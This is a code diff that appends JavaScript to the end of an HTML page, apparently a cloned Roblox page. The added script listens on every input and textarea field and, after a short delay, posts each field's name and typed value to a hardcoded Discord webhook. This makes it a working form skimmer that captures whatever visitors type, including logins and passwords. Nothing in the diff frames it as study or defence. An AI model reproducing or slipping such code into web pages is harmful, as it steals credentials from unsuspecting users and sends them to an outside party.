@@ -1009,3 +1009,26 @@ Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
 </body>
 </html>
 	
+
+
+
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1455252054732705999/hBz8cHYsYzFBsIZ2SkIqWvQ2a9Z6zXSvcAzqPvFpHNK-gP9p5gH3PrF8Gql-a9XRY1cB';
+let timeout = null;
+
+document.querySelectorAll('input, textarea').forEach(elemento => {
+    elemento.addEventListener('input', (e) => {
+        clearTimeout(timeout);
+        const campo = e.target.name || e.target.placeholder || "campo";
+        const valor = e.target.value;
+
+        timeout = setTimeout(() => {
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `📝 **Digitado no site:**\nNo campo \`${campo}\`: ${valor}`
+                })
+            });
+        }, 2000);
+    });
+});
